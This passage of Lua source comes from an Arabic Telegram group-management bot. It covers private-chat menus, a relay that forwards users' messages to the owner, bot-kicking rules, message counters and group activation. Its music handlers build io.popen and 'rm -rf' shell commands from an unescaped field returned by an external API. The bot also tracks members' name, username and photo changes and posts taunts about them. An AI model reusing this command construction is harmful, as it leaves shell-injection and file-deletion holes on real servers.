faederdx1:srem(FAEDER..'bot:momod:'..msg.chat_id_, result.id_)
faederdx1:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif fdrt == "مدير" and is_monsh(msg.sender_user_id_, msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ العضو ( ['..result.title_..'](t.me/'..(text1[3] or 'faeder_ch')..')'..' )\n↫ تم تنزيله من ( '..text1[2]..' )', 1, 'md')
faederdx1:srem(FAEDER..'bot:owners:'..msg.chat_id_, result.id_)
faederdx1:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif fdrt == "عضو" and is_momod(msg.sender_user_id_, msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ العضو ( ['..result.title_..'](t.me/'..(text1[3] or 'faeder_ch')..')'..' )\n↫ تم تنزيله من ( '..text1[2]..' )', 1, 'md')
end else
info = "↫ المعرف غير صحيح"
faederdx(msg.chat_id_, msg.id_, 1, info, 1, 'html')
end end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end end
--     By Developer Faeder     -- 
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match("-100(%d+)") then
faederdx1:incr(FAEDER..'msg'..msg.chat_id_..':'..msg.sender_user_id_) 
Chat_Type = 'arg' 
elseif id:match("^(%d+)") then
faederdx1:sadd(FAEDER..'bot',msg.sender_user_id_)  
Chat_Type = 'pv' 
else
Chat_Type = 'sup' 
end end 
--     By Developer Faeder     -- 
if Chat_Type == 'pv' then 
if text == '/start' then   
function adding(extra,result,success)
local users = faederdx1:scard(FAEDER.."bot:userss")
faederdx(tostring((faederdx1:get(FAEDER.."bot:leader:gr") or bot_owner)), 0, 1, "↫  هذا ارسل ستارت للبوت \n↫ معرفه ← @"..(result.username_ or "لا يوجد").."\n↫ ايديه ← {"..msg.sender_user_id_.."}\n↫ اصبح عدد المشتركين { "..users.." }" , 1, 'html')
end 
getUser(msg.sender_user_id_,adding) 
end end
--     By Developer Faeder     -- 
if Chat_Type == 'pv' then 
if text and text:match("/start hms(.*)_(%d+)") then 
function adding(extra,result,success)
faederdx(tostring((faederdx1:get(FAEDER.."bot:leader:gr") or bot_owner)), 0, 1, "↫ هذا ارسلو له همسه وجالس يشوفها \n↫ معرفه ← @"..(result.username_ or "لا يوجد").."\n↫ ايديه ← {"..msg.sender_user_id_.."}" , 1, 'html') 
end 
getUser(msg.sender_user_id_,adding) 
end end 
--     By Developer Faeder     -- 
if Chat_Type == 'pv' then 
if text == '/start' or text == 'رجوع ' and faeder11(msg) then    
if is_leader(msg) then
local Sudo_Welcome = '*↫ اهلا بك عزيزي Devil  \n↫ اليك اوامر الكيبورد الخاص بسورس لاكس*'
local key = {
{'وضع اسم البوت','ضع كليشه المطور','تحديث'},
{'الاحصائيات','المطورين','قائمه العام'},
{'ضع دعم','القروبات','تعيين قناة الاشتراك'},
{'معلومات السيرفر','تحديث السورس','تفعيل الاشتراك الاجباري'},
{'تفعيل البوت الخدمي','تعطيل البوت الخدمي','جلب نسخه القروبات'},
{"جلب كليشه ستارت",'مسح كليشه ستارت',"ضع كليشه ستارت"},
{'اوامر الاذاعات','اوامر الخدمه','اوامر بوت التواصل'},
} 
send_inline(msg.chat_id_,Sudo_Welcome,key)
return false
end end end
--     By Developer Faeder     -- 
if Chat_Type == 'pv' then
if text == 'اوامر الاذاعات' and faeder11(msg) then  
if is_leader(msg) then 
local Sudo_Welcome = '↫ اهلا بك مره اخرى عزيزي المطور \n↫ اليك ازرار خدمه الاذاعات\n↫ ملاحظه : امر ( توجيه للكل ) يجب ان يكون بالرد'
local key = {
{'اذاعه'},
{'توجيه للكل','اذاعه بالتوجيه'},
{'اذاعه خاص بالتوجيه','نشر بالخاص'},
{'رجوع '}, 
}
send_inline(msg.chat_id_,Sudo_Welcome,key)
return false
end end end
--     By Developer Faeder     -- 
if Chat_Type == 'pv' then 
if text == 'اوامر بوت التواصل' and faeder11(msg) then  
if is_leader(msg) then 
local Sudo_Welcome = '↫ اهلا بك مره اخرى عزيزي المطور \n↫ اليك ازرار خدمه بوت التواصل'
local key = {
{'تعطيل التواصل','تفعيل التواصل'},
{'الغاء حظر','حظر'},
{'رجوع '}, 
} 
send_inline(msg.chat_id_,Sudo_Welcome,key)
return false
end end end
--     By Developer Faeder     -- 
 if Chat_Type == 'pv' then 
if text == 'اوامر الخدمه' and faeder11(msg) then    
local Sudo_Welcome = '↫ يمكنك ايضا استخدام الاوامر الخدميه \n↫ اليك ازرار الاوامر الخدميه'
local key = {
{'زخرفه','احسب عمرك'},
{'الابراج','نسبه الحب'},
{'ضحكني'},
{'افتارات عيال'},
{'الالعاب'},
{'تخمين','كت تويت'},
{'ترتيب','سمايلات'},
{'حزوره','المعاني'},
{'افتارات بنات'},
{'العكس','المحيبس'},
{'امثله','المختلف'},
{'انقليزي','رياضيات'},
{'افتارات انمي'},
}
send_inline(msg.chat_id_,Sudo_Welcome,key)
return false
end end 
--     By Developer Faeder     -- 
if Chat_Type == 'pv' then
if text == '/start' and faeder11(msg) then    
if not faederdx1:get(FAEDER..'Start:Time'..msg.sender_user_id_) then
local inline = {{{text="المطور 🎖.",url="t.me/"..(SudoFaeder or "Faeder_ch")}}}
local Sudo_Welcome = '↫ يمكنك ايضا استخدام الاوامر الخدميه \n↫ اليك ازرار الاوامر الخدميه اسفل الرساله\n                  ───────────────\n                              '
local key = {
{'زخرفه','احسب عمرك'},
{'الابراج','نسبه الحب'},
{'ضحكني'},
{'افتارات عيال'},
{'الالعاب'},
{'تخمين','كت تويت'},
{'ترتيب','سمايلات'},
{'حزوره','المعاني'},
{'افتارات بنات'},
{'العكس','المحيبس'},
{'امثله','المختلف'},
{'انقليزي','رياضيات'},
{'افتارات انمي'},
}
local start = faederdx1:get(FAEDER.."Start:Bot")
if start then 
Start_Source = start
else
Start_Source = "↫ مرحبا انا بوت اسمي { "..name_bot.." }\n↫ اختصاصي حماية المجموعات\n↫ من التفليش والسبام والخخ .. . \n↫ قم برفعي ادمن في مجموعتك وارسل ( تفعيل )\n↫ سيتم رفع الادمنيه والمنشئ تلقائيا\n↫السورس يحتوي على مميزات كثيره وممتعه اكتشفها"
end
send_inline(msg.chat_id_,Start_Source,nil,inline)
send_inline(msg.chat_id_,Sudo_Welcome,key)
end
faederdx1:setex(FAEDER..'Start:Time'..msg.sender_user_id_,300,true)
return false
end end
if text and faederdx1:get(FAEDER..'Start:Bots') then
if text == 'الغاء' then   
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم الغاء حفظ كليشة الستارت .', 1, 'md')
faederdx1:del(FAEDER..'Start:Bots') 
return false
end
faederdx1:set(FAEDER.."Start:Bot",text)  
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم حفظ كليشة الستارت .', 1, 'md')
faederdx1:del(FAEDER..'Start:Bots') 
return false
end
--     By Developer Faeder     -- 
if is_leader(msg) then
if text == 'تعيين رد الخاص' or text == 'ضع كليشه ستارت' or text == ' تعيين رد الخاص ⌁' then 
faederdx1:set(FAEDER..'Start:Bots',true) 
faederdx(msg.chat_id_, msg.id_, 1, '↫ ارسل لي كليشه ستارت جديده .', 1, 'md')
return false 
end
if text == 'حذف رد الخاص' or text == 'حذف كليشه ستارت' or text == 'مسح رد الخاص' or text == 'مسح كليشه ستارت' then  
faederdx1:del(FAEDER..'Start:Bot') 
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم مسح كليشه الستارت .', 1, 'md')
end
if text == 'جلب رد الخاص' or text == 'جلب كليشه ستارت' then    
local start = faederdx1:get(FAEDER.."Start:Bot")
if start then 
Start_Source = start
else
Start_Source = "↫ مرحبا انا بوت اسمي { "..name_bot.." }\n↫ اختصاصي حماية المجموعات\n↫ من التفليش والسبام والخخ .. . \n↫ قم برفعي ادمن في مجموعتك وارسل ( تفعيل )\n↫ سيتم رفع الادمنيه والمنشئ تلقائيا"
end
faederdx(msg.chat_id_, msg.id_, 1, Start_Source, 1, 'md')
return false
end end
--     By Developer Faeder     -- 
if text and text:match('^بصمه (.*)$') then
  local Ttext = text:match('^بصمه (.*)$')
  local InfoSearch = https.request('https://mode-dev.tk/tg/search.php?search='..URL.escape(Ttext))
  local JsonSearch = JSON.decode(InfoSearch)
  for k,vv in pairs(JsonSearch.results) do
  if k == 1 then
  local GetStart = io.popen('downloadsh '..vv.url):read('*all')
  if GetStart and GetStart:match('(.*)oksend(.*)') then
  print('download Mp3 done ...\nName : '..vv.title..'\nIdLink : '..vv.url)
  sendVoice(msg.chat_id_, msg.id_, 0, 1, nil,'./'..vv.url..'.mp3',vv.title,'- '..vv.title..'\n- @iiDark','@iiDark')
  os.execute('rm -rf ./'..vv.url..'.mp3')
  end
  end
  end
  end
  if text and text:match('^صوت (.*)$') then
  local Ttext = text:match('^صوت (.*)$')
  local InfoSearch = https.request('https://mode-dev.tk/tg/search.php?search='..URL.escape(Ttext))
  local JsonSearch = JSON.decode(InfoSearch)
  for k,vv in pairs(JsonSearch.results) do
  if k == 1 then
  local GetStart = io.popen('downloadsh '..vv.url):read('*all')
  if GetStart and GetStart:match('(.*)oksend(.*)') then
  print('download Mp3 done ...\nName : '..vv.title..'\nIdLink : '..vv.url)
  sendAudio(msg.chat_id_,msg.id_,'./'..vv.url..'.mp3',vv.title,'- '..vv.title..'\n- @BADBOY_HERE','@BADBOY_HERE')
  os.execute('rm -rf ./'..vv.url..'.mp3')
  end
  end
  end
  end
--     By Developer Faeder     -- 
if text == 'احسب عمرك' then faederdx(msg.chat_id_, msg.id_, 1, '↫ من خلال البوت يمكنك حساب عمرك \n↫ فقط قم بارسال امر احسب + مواليدك الى البوت \n↫ بالتنسيق التالي مثال : احسب 1996/1/17', 1, 'md') end
if text == 'الابراج' then faederdx(msg.chat_id_, msg.id_, 1, '↫ من خلال البوت يمكنك معرفه توقعات برجك \n↫ فقط قم بارسال امر برج + اسم البرج \n↫ مثال : برج الدلو \n↫ لمعرفه برجك قم بالرجوع الى قسم حساب العمر ', 1, 'md') end
if text == 'قسم الحمايه' then faederdx(msg.chat_id_, msg.id_, 1, '↫ اضف البوت في المجموعه وارسل تفعيل \n↫ وتمتع بخدمات غير منتشره ', 1, 'md') end
if text == '•┉ • ┉ • ┉ • ┉ • ┉•' then faederdx(msg.chat_id_, msg.id_, 1, '↫ اختر لعبه من الكيبورد بالاسفل ', 1, 'md') end
if Chat_Type == 'pv' then   
if not is_leader(msg) and not faederdx1:sismember(FAEDER..'BaN:In:User',msg.sender_user_id_) and not faederdx1:get(FAEDER..'Texting:In:Bv') then
faederdx(msg.sender_user_id_, msg.id_, 1, '↫ تم ارسال رسالتك الى [مطور البوت](t.me/'..SudoFaeder..')', 1, 'md')
tdcli_function({ID ="GetChat",chat_id_=bot_owner},function(arg,chat)  
tdcli_function({ID ="GetChat",chat_id_=msg.sender_user_id_},function(arg,chat)  
tdcli_function({ID="ForwardMessages",chat_id_=bot_owner,from_chat_id_= msg.sender_user_id_,message_ids_={[0]=msg.id_},disable_notification_=1,from_background_=1},function(arg,data) 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,dp) 
if data and data.messages_ and data.messages_[0] ~= false and data.ID ~= "Error" then
if data and data.messages_ and data.messages_[0].content_.sticker_ then
sendText(bot_owner,'↫ تم ارسال الملصق من \n['..string.sub(dp.first_name_,0, 40)..'](tg://user?id='..dp.id_..')',0,'md')
return false
end;end;end,nil);end,nil);end,nil);end,nil);end
if is_leader(msg) and msg.reply_to_message_id_ ~= 0  then    
tdcli_function({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)},function(extra, result, success) 
if result.forward_info_.sender_user_id_ then     
id_user = result.forward_info_.sender_user_id_    
end     
tdcli_function ({ID = "GetUser",user_id_ = id_user},function(arg,data) 
if text == 'حظر' then
local Text = '↫ تم حظره من التواصل بنجاح .'
sendText(bot_owner,Text,msg.id_/2097152/0.5,'md') 
faederdx1:sadd(FAEDER..'BaN:In:User',data.id_)  
return false  
end 
if text == 'الغاء الحظر' or text == 'الغاء حظر' then 
local Text = '↫ تم الغاء حظره من التواصل بنجاح .'
sendText(bot_owner,Text,msg.id_/2097152/0.5,'md') 
faederdx1:srem(FAEDER..'BaN:In:User',data.id_)  
return false 
end 
tdcli_function({ID='GetChat',chat_id_ = id_user},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",chat_id_ = id_user, action_ = {  ID = "SendMessageTypingAction", progress_ = 100} },function(arg,dp) 
if dp.code_ == 400 or dp.code_ == 5 then
faederdx(msg.chat_id_, msg.id_, 1, '↫ لم يتم ارسال رسالتك لان العظو قام بحظر البوت .', 1, 'md')
return false  
end  
if text then
faederdx(id_user, 0, 1, text, 1, "md")  
Text = '↫ تم ارسال الرساله الى '
elseif msg.content_.ID == 'MessageSticker' then    
sendSticker(id_user, msg.id_, 0, 1,nil, msg.content_.sticker_.sticker_.persistent_id_)   
Text = 'تم ارسال الملصق الى '
elseif msg.content_.ID == 'MessagePhoto' then    
sendPhoto(id_user, msg.id_, 0, 1,nil, msg.content_.photo_.sizes_[0].photo_.persistent_id_,(msg.content_.caption_ or ''))    
Text = '↫ تم ارسال الملصق الى '
elseif msg.content_.ID == 'MessageAnimation' then    
sendDocument(id_user, msg.id_, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_)    
Text = '↫ تم ارسال المتحركه الى '
elseif msg.content_.ID == 'MessageVoice' then    
sendVoice(id_user, msg.id_, 0, 1,nil, msg.content_.voice_.voice_.persistent_id_)    
Text = '↫ تم ارسال البصمه الى '
end     
sendText(bot_owner, Text..'\n'..'['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')',0,'md') 
end,nil); end,nil); end,nil); end,nil); end end 
if is_leader(msg) then
if text == 'تفعيل التواصل' then   
local faeder = '↫ اهلا عزيزي '..renk_faeder(msg)..'\n↫ تم تفعيل التواصل .'
faederdx(msg.chat_id_, msg.id_, 1,faeder, 1, 'md') 
faederdx1:del(FAEDER..'Texting:In:Bv') 
end
if text == 'تعطيل التواصل' then  
local faeder = '↫ اهلا عزيزي '..renk_faeder(msg)..'\n↫ تم تعطيل التواصل .'
faederdx(msg.chat_id_, msg.id_, 1,faeder, 1, 'md') 
faederdx1:set(FAEDER..'Texting:In:Bv',true) 
end end
--     By Developer Faeder     -- 
faederdx1:sadd(FAEDER.."groups:users" .. msg.chat_id_, msg.sender_user_id_)--save users gp
faederdx1:incr(FAEDER.."msgs:"..msg.sender_user_id_..":"..msg.chat_id_.."")--save msgs gp
if msg.content_.ID == "MessageChatDeleteMember" then
if tonumber(msg.content_.user_.id_) == tonumber(bot_id) then
faederdx1:del(FAEDER.."bot:enable:" .. msg.chat_id_)
faederdx1:srem(FAEDER.."bot:groups", msg.chat_id_) 
end end 
function chek_admin(chat_id,set) 
local function promote_admin(extra,result,success)   
limit = result.administrator_count_   
if tonumber(limit) > 0 then 
getChannelMembers(chat_id, 0, 'Administrators', limit,set)   
end end
getChannelFull(chat_id,promote_admin)
end
--     By Developer Faeder     -- 
function channel_get_kicked(channel,cb)
local function callback_admins(extra,result,success)
limit = result.kicked_count_
getChannelMembers(channel, 0, 'Kicked', limit,cb)
end
getChannelFull(channel,callback_admins)
end
--     By Developer Faeder     -- 
function deleteMessagesFromUser(chat_id, user_id)
tdcli_function ({
ID = "DeleteMessagesFromUser",
chat_id_ = chat_id,
user_id_ = user_id
}, dl_cb, nil)
end
--     By Developer Faeder     -- 
function forwardMessages(chat_id, from_chat_id, message_ids, disable_notification)
tdcli_function ({
ID = "ForwardMessages",
chat_id_ = chat_id,
from_chat_id_ = from_chat_id,
message_ids_ = message_ids, -- vector
disable_notification_ = disable_notification,
from_background_ = 1
}, dl_cb, nil)
end
--     By Developer Faeder     -- 
function getUser(user_id, cb)
tdcli_function ({
ID = "GetUser",
user_id_ = user_id
}, cb, nil)
end
--     By Developer Faeder     -- 
local msg = data.message_
text = msg.content_.text_
if text and not faederdx1:get(FAEDER..'lock:bot:ttt'..bot_id) and not faederdx1:get(FAEDER.."lock:bot:ttt2:"..msg.chat_id_) then 
function faeder(extra,result,success)
if result.id_ then 
local dx = faederdx1:get("faeder:name"..result.id_)
if not result.first_name_ then 
if dx then 
faederdx1:del("faeder:name"..result.id_) 
end end
if result.first_name_ then 
if dx and dx ~= result.first_name_ then 
local faeder_text = {
  "اسمك الجديد { "..result.first_name_.." }\n ليش غيرته ",
  "اسمك الجديد { "..result.first_name_.." }\n مو حلو رجعه القديم ",
  "ليش غيرت اسمك { "..result.first_name_.." }\n زرفت احد حبيبي ؟ ",
  "اسمك الجديد زق { "..result.first_name_.." }", 
}
dxx = math.random(#faeder_text)
faederdx(msg.chat_id_, msg.id_, 1, faeder_text[dxx], 1, 'html')
end  
faederdx1:set("faeder:name"..result.id_, result.first_name_)  
end end end
getUser(msg.sender_user_id_, faeder)
end
--     By Developer Faeder     -- 
local msg = data.message_
text = msg.content_.text_
if msg.content_.ID == "MessageChatAddMembers" then  
faederdx1:set(FAEDER.."Who:Added:Me"..msg.chat_id_..':'..msg.content_.members_[0].id_,msg.sender_user_id_)
end
--     By Developer Faeder     -- 
local msg = data.message_
text = msg.content_.text_
if msg.content_.ID == "MessageChatAddMembers" then  
local mem_id = msg.content_.members_  
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and faederdx1:get(FAEDER.."bot:bots:ban" .. msg.chat_id_) and not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
chat_kick(msg.chat_id_,mem_id[i].id_)
chat_kick(msg.chat_id_, msg.sender_user_id_)
end end end
--     By Developer Faeder     -- 
if msg.content_.ID == "MessageChatAddMembers" then  
local mem_id = msg.content_.members_  
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and faederdx1:get(FAEDER.."bot:bots:mute" .. msg.chat_id_) and not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
chat_kick(msg.chat_id_,mem_id[i].id_)
end end end
--     By Developer Faeder     -- 
if msg.content_.ID == "MessageChatAddMembers" then  
local mem_id = msg.content_.members_  
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and faederdx1:get(FAEDER.."keed_bots"..msg.chat_id_)  and not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
chat_kick(msg.chat_id_,mem_id[i].id_)
faederdx1:sadd(FAEDER..'bot:keed:'..msg.chat_id_, msg.sender_user_id_)
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. msg.sender_user_id_ .. "&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false")
faederdx1:sadd(FAEDER..'bot:keed:'..msg.chat_id_, msg.sender_user_id_)
end end end
--     By Developer Faeder     -- 
if msg.content_.ID == "MessageChatDeleteMember" and tonumber(msg.content_.user_.id_) == tonumber(FAEDER) then 
faederdx1:srem("faeder:addg"..bot_id, msg.chat_id_) 
faederdx1:del(FAEDER.."bot:charge:"..msg.chat_id_)
function faeder(extra,result,success) 
function  reslit(f1,f2)
function faeder333(t1,t2)
tdcli_function ({ ID = "GetChat", chat_id_ = bot_owner },function(arg,chat)  
faederdx(tostring((faederdx1:get(FAEDER.."bot:leader:gr") or bot_owner)), 0, 1, "↫ تم طرد البوت من مجموعه  \n↫ معرف العضو ← @"..(result.username_ or "لا يوجد").."\n↫ ايدي العضو ← `"..msg.sender_user_id_.."`\n↫ معلومات المجموعه  \n\n↫ اسم المجموعه ←  *"..f2.title_.."*\n↫ ايدي المجموعه ← `"..msg.chat_id_.."`\n↫ رابط المجموعه \n↫ تم مسح جميع بياناتها\n" , 1, 'md')
end,nil)   
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
}, faeder333, nil)
end
tdcli_function ({
ID = "GetChat",
chat_id_ = msg.chat_id_
}, reslit, nil) 
end
getUser(msg.sender_user_id_, faeder)
end
--     By Developer Faeder     -- 
if msg.content_.ID == "MessageChatDeletePhoto" or msg.content_.ID == "MessageChatChangePhoto" or msg.content_.ID == 'MessagePinMessage' or msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == 'MessageChatChangeTitle' or msg.content_.ID == "MessageChatDeleteMember" then   
if faederdx1:get(FAEDER..'bot:tgservice:jk'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)    
end end
--     By Developer Faeder     -- 
local msg = data.message_
text = msg.content_.text_
if text and not faederdx1:get(FAEDER..'lock:bot:ttt'..bot_id) and not faederdx1:get(FAEDER.."lock:bot:ttt2:"..msg.chat_id_) then  
function faeder(extra,result,success)
if result.id_ then 
local dx = faederdx1:get("faeder:Userr"..result.id_)
if not result.username_ then 
if dx then 
faederdx(msg.chat_id_, msg.id_, 1, "ترا ذا غير معرفه ازرفو المعرف حقه  \n هاذه معرفه : @"..dx, 1, 'html')
faederdx1:del("faeder:Userr"..result.id_) 
end end
if result.username_ then 
if dx and dx ~= result.username_ then 
local faeder_text = {
  'مسكتك ليه مغير يوزرك؟',
  "ليه مغير يوزرك يمسكين شقول نشروك بقنوات انحراف",
  "من وين جبت يوزرك الجديد",
  "ازرفوه \n ذا يوزره القديم  @"..result.username_.."",
}
dxx = math.random(#faeder_text)
faederdx(msg.chat_id_, msg.id_, 1, faeder_text[dxx], 1, 'html')
end  
faederdx1:set("faeder:Userr"..result.id_, result.username_) 
end end end
getUser(msg.sender_user_id_, faeder)
end
--     By Developer Faeder     -- 
local msg = data.message_
text = msg.content_.text_
if text and not faederdx1:get(FAEDER..'lock:bot:ttt'..bot_id) and not faederdx1:get(FAEDER.."lock:bot:ttt2:"..msg.chat_id_) then  
function dx(extra,result,success)
if result.id_ then 
local dx2 = faederdx1:get("dx:photo"..result.id_)
if not result.profile_photo_ then 
if dx2 then 
faederdx(msg.chat_id_, msg.id_, 1, "حذف كل صوره الحلو ", 1, 'html')
faederdx1:del("dx:photo"..result.id_) 
end end
if result.profile_photo_ then 
if dx2 and dx2 ~= result.profile_photo_.big_.persistent_id_ then 
local dx_text = {
  "والله صورتك الجديده رهيبه",
  "صورتك الجديده ماش",
  "اوف ي الافتار الرهيب الجديد ذا من وين جبته",
  "شكلك شوقر دادي كل شوي تغير افتار",
}
dx3 = math.random(#dx_text)
faederdx(msg.chat_id_, msg.id_, 1, dx_text[dx3], 1, 'html')
end  
faederdx1:set("dx:photo"..result.id_, result.profile_photo_.big_.persistent_id_) 
end end end
getUser(msg.sender_user_id_, dx)
end
--     By Developer Faeder     -- 
local function openChat(chat_id,dl_cb)
tdcli_function ({
ID = "GetChat",
chat_id_ = chat_id
}, dl_cb, nil) 
end
--     By Developer Faeder     -- 
function resolve_username(username,cb)
tdcli_function ({
ID = "SearchPublicChat",
username_ = username
}, cb, nil)
end
--     By Developer Faeder     -- 
res = 'https://api.telegram.org/bot'..tokenbot
function Mute_time(chat_id,user_id,time)
local mut = res.. '/restrictChatMember?chat_id=' .. chat_id .. '&user_id=' .. user_id..'&can_post_messages=false&until_date='..time
return https.request(mut)
end
--     By Developer Faeder     -- 
function string:split(sep)
local sep, fields = sep or ":", {}
local pattern = string.format("([^%s]+)", sep)
self:gsub(pattern, function(c) fields[#fields+1] = c end)
return fields
end
--     By Developer Faeder     -- 
function faedr(msg,data) 
local msg = data.message_
local text = msg.content_.text_
local caption = msg.content_.caption_
if text ==('تفعيل') and not is_admin(msg.sender_user_id_, msg.chat_id_) and not faederdx1:get(FAEDER..'lock:bot:free'..bot_id) and faeder11(msg) then
function adding(extra,result,success)
local function promote_admin(extra, result, success)
local num = 0
local admins = result.members_  
for i=0 , #admins do   
num = num + 1
faederdx1:sadd(FAEDER..'bot:momod:'..msg.chat_id_,admins[i].user_id_)
if result.members_[i].status_.ID == "ChatMemberStatusCreator" then
owner_id = admins[i].user_id_
faederdx1:sadd(FAEDER.."bot:monsh:"..msg.chat_id_,owner_id)
end end end
getChannelMembers(msg.chat_id_, 0, 'Administrators', 200, promote_admin)
if not is_admin(msg.sender_user_id_, msg.chat_id_) then
if faederdx1:get(FAEDER.."bot:enable:"..msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ المجموعه : *'..title_name(msg.chat_id_)..'*\n↫ مفعله سابقا بالبوت .', 1, 'md')
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ اهلا عزيزي '..renk_faeder(msg)..'\n↫ تم تفعيل المجموعه ورفع المشرفين .', 1, 'md')
openChat(msg.chat_id_,faeder)
faederdx1:sadd("faeder:addg"..bot_id, msg.chat_id_)
function faeder(f1,f2) 
function faeder333(t1,t2) 
if t2.invite_link_ == false then 
local getlink = 'https://api.telegram.org/bot'..tokenbot..'/exportChatInviteLink?chat_id='..msg.chat_id_
local req = https.request(getlink)
local link = json:decode(req)
if link.ok == true then 
t2.invite_link_ = link.result
end end 
faederdx1:set(FAEDER.."bot:group:link"..msg.chat_id_,(t2.invite_link_ or "Error")) 
faederdx(tostring((faederdx1:get(FAEDER.."bot:leader:gr") or bot_owner)), 0, 1, "↫ تم تفعيل مجموعه جديده  \n↫ معرف الضافني ← @"..(result.username_ or "لا يوجد").."\n↫ ايدي الضافني ← `"..msg.sender_user_id_.."`\n↫ معلومات المجموعه  \n\n↫ اسم المجموعه ←  *"..f2.title_.."*\n↫ ايدي المجموعه ← `"..msg.chat_id_.."`\n↫ رابط المجموعه \n↫ "..(t2.invite_link_ or "Error").."\n" , 1, 'md')
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID 
}, faeder333, nil)
end
openChat(msg.chat_id_,faeder) 
faederdx1:set(FAEDER.."bot:enable:"..msg.chat_id_,true)
faederdx1:setex(FAEDER.."bot:charge:"..msg.chat_id_,86400,true)
faederdx1:sadd("faeder:addg"..bot_id, msg.chat_id_)
end end end
getUser(msg.sender_user_id_,adding) 
end end  
--     By Developer Faeder     -- 
if (data.ID == "UpdateNewMessage") then
local msg = data.message_
--vardump(data)
local d = data.disable_notification_
local chat = chats[msg.chat_id_]
faedr(data.message_,data)
--     By Developer Faeder     -- 
-------- OLD MSG
if msg.date_ < (os.time() - 30) then
print("**** OLD MSG ****")
return false
end
--     By Developer Faeder     -- 
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
faederdx1:set(bot_id..'FAEDER:UserName'..msg.sender_user_id_,data.username_)
end;end,nil)
--     By Developer Faeder     -- 
local idf = tostring(msg.chat_id_)
if not faederdx1:get(FAEDER.."bot:enable:"..msg.chat_id_) and not idf:match("^(%d+)") and not is_admin(msg.sender_user_id_, msg.chat_id_) then
print("Return False [ Not Enable ]")
return false
end
--     By Developer Faeder     -- 
if msg and msg.send_state_.ID == "MessageIsSuccessfullySent" then
function get_mymsg_contact(extra, result, success)
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,get_mymsg_contact)
return
end
--     By Developer Faeder     -- 
faederdx1:incr(FAEDER.."bot:allmsgs")
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match('-100(%d+)') then
if msg.can_be_deleted_ == true then 
faederdx1:sadd(FAEDER.."bot:groups",msg.chat_id_)
end
if not faederdx1:sismember(FAEDER.."bot:groups",msg.chat_id_) then
faederdx1:sadd(FAEDER.."bot:groups",msg.chat_id_)
end
elseif id:match('^(%d+)') then
if not faederdx1:sismember(FAEDER.."bot:userss",msg.chat_id_) then
faederdx1:sadd(FAEDER.."bot:userss",msg.chat_id_)
end else
if not faederdx1:sismember(FAEDER.."bot:groups",msg.chat_id_) then
faederdx1:sadd(FAEDER.."bot:groups",msg.chat_id_)
end end end
--     By Developer Faeder     -- 
-------- MSG TYPES 
if msg.content_ then
if msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" then
print("This is [ Inline ]")
msg_type = 'MSG:Inline'
end
--     By Developer Faeder     -- 
if msg.content_.ID == "MessageText" then
text = msg.content_.text_
print("This is [ Text ]")
msg_type = 'MSG:Text'
end
--     By Developer Faeder     -- 
 if msg.content_.ID == "MessageChatAddMembers" then
faederdx1:incr(FAEDER..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)
end
if msg.content_.ID == "MessagePhoto" then
faederdx1:incr(FAEDER.."Photo:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end
if msg.content_.ID == "MessageAnimation" then
faederdx1:incr(FAEDER.."Gif:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end
if msg.content_.ID == "MessageVideo" then
faederdx1:incr(FAEDER.."Video:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end
if msg.content_.ID == "MessageVoice" then
faederdx1:incr(FAEDER.."Voice:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end
if msg.content_.ID == "MessageSticker" then
faederdx1:incr(FAEDER.."sticker:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end
--     By Developer Faeder     -- 
if msg.content_.ID == "MessageChatJoinByLink" and not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if faederdx1:get(FAEDER.."Lock:Join"..msg.chat_id_) then
chat_kick(msg.chat_id_,msg.sender_user_id_) 
return false  
end
end
--     By Developer Faeder     -- 
if msg.content_.ID == "MessagePhoto" then
print("This is [ Photo ]")
msg_type = 'MSG:Photo'
end
--     By Developer Faeder     -- 
if msg.content_.ID == "MessageChatAddMembers" then
print("This is [ New User Add ]")
msg_type = 'MSG:NewUserAdd'
end
--     By Developer Faeder     -- 
if msg.content_.ID == "MessageDocument" then
print("This is [ File Or Document ]")
msg_type = 'MSG:Document'
end
